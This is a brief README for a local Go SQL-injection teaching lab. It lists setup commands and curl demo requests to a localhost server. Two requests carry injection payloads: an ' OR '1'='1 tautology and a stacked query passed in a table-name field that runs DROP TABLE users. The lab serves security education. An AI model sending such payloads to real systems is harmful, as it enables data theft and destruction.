### SQLi minilab
```
cd go-sqli-lab
go mod init go-sqli-lab
go get modernc.org/sqlite
go run sqli.go
```

Как взаимодействовать для демо
```
curl "http://localhost:8080/concat/safe?name=alice"

НО...

curl "http://localhost:8080/concat/unsafe?name=%27%20OR%20%271%27=%271"

ИЛИ

curl -G \
  --data-urlencode 'table=users (name, email) VALUES ($1, $2); DROP TABLE users;--' \
  --data-urlencode 'name=mallory' \
  --data-urlencode 'email=mallory@example.com' \
  "http://localhost:8080/table/unsafe"
```